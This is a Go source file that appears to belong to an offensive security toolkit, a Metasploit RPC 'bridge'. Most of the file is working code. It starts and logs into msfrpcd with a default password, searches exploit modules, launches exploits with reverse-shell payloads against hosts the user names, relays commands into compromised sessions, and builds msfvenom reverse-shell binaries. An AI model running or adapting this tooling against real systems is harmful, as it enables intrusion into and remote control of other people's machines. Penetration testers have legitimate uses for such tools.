package msfengine

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os/exec"
	"strings"
	"time"

	"github.com/bryanparreira/davoid/internal/modules/ui"
)

type rpcReq struct {
	Method string        `json:"method"`
	Token  string        `json:"token,omitempty"`
	Params []interface{} `json:"params"`
}

type rpcResp struct {
	Result interface{} `json:"result"`
	Error  interface{} `json:"error"`
}

var (
	rpcURL   string
	rpcToken string
	client   = &http.Client{Timeout: 15 * time.Second}
)

func Run() error {
	ui.Header("Metasploit Bridge — MSF RPC Orchestrator")

	host := ui.PromptDefault("MSF RPC host", "127.0.0.1")
	port := ui.PromptDefault("MSF RPC port", "55553")
	pass := ui.PromptDefault("MSF RPC password", "msf")

	rpcURL = fmt.Sprintf("http://%s:%s/api/1.0/", host, port)

	// Try to start msfrpcd if not running
	if !isRPCAlive(host, port) {
		if _, err := exec.LookPath("msfrpcd"); err != nil {
			ui.Fail("msfrpcd not found. Install Metasploit Framework.")
			return nil
		}
		ui.Info("Starting msfrpcd...")
		cmd := exec.Command("msfrpcd", "-P", pass, "-p", port, "-S", "-f")
		cmd.Start()
		time.Sleep(3 * time.Second)
	}

	// Authenticate
	ui.Info("Authenticating to MSF RPC...")
	token, err := authRPC(pass)
	if err != nil {
		ui.Fail(fmt.Sprintf("Auth failed: %v", err))
		return nil
	}
	rpcToken = token
	ui.Success("Connected to Metasploit.")

	for {
		action := ui.Select("MSF Operation", []string{
			"List active sessions",
			"Search exploits by port/service",
			"Run exploit",
			"Interact with session",
			"Generate msfvenom payload",
		})
		if action < 0 {
			break
		}

		switch action {
		case 0:
			listSessions()
		case 1:
			searchExploits()
		case 2:
			runExploit()
		case 3:
			interactSession()
		case 4:
			genPayload()
		}
	}
	return nil
}

func isRPCAlive(host, port string) bool {
	conn, err := net.DialTimeout("tcp", host+":"+port, 2*time.Second)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func rpcCall(method string, params ...interface{}) (interface{}, error) {
	req := rpcReq{Method: method, Token: rpcToken, Params: params}
	body, _ := json.Marshal(req)
	resp, err := client.Post(rpcURL, "application/json", bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	var r rpcResp
	if err := json.Unmarshal(data, &r); err != nil {
		return nil, err
	}
	if r.Error != nil {
		return nil, fmt.Errorf("RPC error: %v", r.Error)
	}
	return r.Result, nil
}

func authRPC(pass string) (string, error) {
	req := rpcReq{Method: "auth.login", Params: []interface{}{"msf", pass}}
	body, _ := json.Marshal(req)
	resp, err := client.Post(rpcURL, "application/json", bytes.NewReader(body))
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	var r map[string]interface{}
	json.Unmarshal(data, &r)
	if token, ok := r["token"].(string); ok {
		return token, nil
	}
	return "", fmt.Errorf("no token in response: %s", string(data))
}

func listSessions() {
	result, err := rpcCall("session.list")
	if err != nil {
		ui.Fail(fmt.Sprintf("session.list failed: %v", err))
		return
	}
	sessions, ok := result.(map[string]interface{})
	if !ok || len(sessions) == 0 {
		ui.Warn("No active sessions.")
		ui.PressEnter()
		return
	}
	fmt.Println()
	fmt.Printf("  %-5s  %-15s  %-20s  %-15s  %s\n",
		ui.Bold.Render("ID"),
		ui.Bold.Render("TYPE"),
		ui.Bold.Render("HOST"),
		ui.Bold.Render("USER"),
		ui.Bold.Render("INFO"),
	)
	ui.Divider()
	for id, s := range sessions {
		if sess, ok := s.(map[string]interface{}); ok {
			fmt.Printf("  %-5s  %-15v  %-20v  %-15v  %v\n",
				id,
				sess["type"],
				sess["target_host"],
				sess["username"],
				sess["info"],
			)
		}
	}
	ui.PressEnter()
}

func searchExploits() {
	keyword := ui.Prompt("Search keyword (e.g. eternalblue, smb, apache)")
	if keyword == "" {
		return
	}
	result, err := rpcCall("module.search", keyword)
	if err != nil {
		ui.Fail(fmt.Sprintf("module.search failed: %v", err))
		return
	}
	modules, ok := result.([]interface{})
	if !ok || len(modules) == 0 {
		ui.Warn("No modules found.")
		ui.PressEnter()
		return
	}
	fmt.Println()
	count := 0
	for _, m := range modules {
		if mod, ok := m.(map[string]interface{}); ok {
			if mod["type"] == "exploit" {
				fmt.Printf("  %s  %s  %s\n",
					ui.Cyan.Render(fmt.Sprintf("%-40v", mod["fullname"])),
					ui.Yellow.Render(fmt.Sprintf("%-8v", mod["rank"])),
					ui.Dim.Render(truncate(fmt.Sprintf("%v", mod["description"]), 60)),
				)
				count++
				if count >= 20 {
					break
				}
			}
		}
	}
	ui.PressEnter()
}

func runExploit() {
	exploitName := ui.Prompt("Exploit module path (e.g. exploit/multi/handler)")
	target := ui.Prompt("RHOSTS")
	lhost := ui.Prompt("LHOST")
	lport := ui.PromptDefault("LPORT", "4444")
	payload := ui.PromptDefault("Payload", "generic/shell_reverse_tcp")

	opts := map[string]interface{}{
		"RHOSTS":  target,
		"LHOST":   lhost,
		"LPORT":   lport,
		"payload": payload,
	}

	ui.Info(fmt.Sprintf("Running %s...", exploitName))
	result, err := rpcCall("module.execute", "exploit", exploitName, opts)
	if err != nil {
		ui.Fail(fmt.Sprintf("Execute failed: %v", err))
		return
	}
	ui.Success(fmt.Sprintf("Result: %v", result))
	ui.PressEnter()
}

func interactSession() {
	sessID := ui.Prompt("Session ID")
	if sessID == "" {
		return
	}
	ui.Info(fmt.Sprintf("Interacting with session %s. Type 'exit' to detach.", sessID))
	for {
		cmd := ui.Prompt("shell")
		if cmd == "exit" || cmd == "quit" {
			break
		}
		result, err := rpcCall("session.shell_write", sessID, cmd+"\n")
		if err != nil {
			ui.Fail(fmt.Sprintf("%v", err))
			continue
		}
		_ = result
		time.Sleep(500 * time.Millisecond)
		out, err := rpcCall("session.shell_read", sessID)
		if err == nil {
			if data, ok := out.(map[string]interface{}); ok {
				if s, ok := data["data"].(string); ok {
					fmt.Print(s)
				}
			}
		}
	}
}

func genPayload() {
	payload := ui.PromptDefault("Payload", "linux/x86/shell_reverse_tcp")
	lhost := ui.Prompt("LHOST")
	lport := ui.PromptDefault("LPORT", "4444")
	format := ui.PromptDefault("Format", "elf")
	outFile := ui.PromptDefault("Output file", "payload.bin")

	args := []string{
		"-p", payload,
		"LHOST=" + lhost,
		"LPORT=" + lport,
		"-f", format,
		"-o", outFile,
	}

	cmd := exec.Command("msfvenom", args...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		ui.Fail(fmt.Sprintf("msfvenom error: %v\n%s", err, string(out)))
		return
	}
	ui.Success(fmt.Sprintf("Payload generated: %s\n%s", outFile, strings.TrimSpace(string(out))))
	ui.PressEnter()
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max-3] + "..."
}
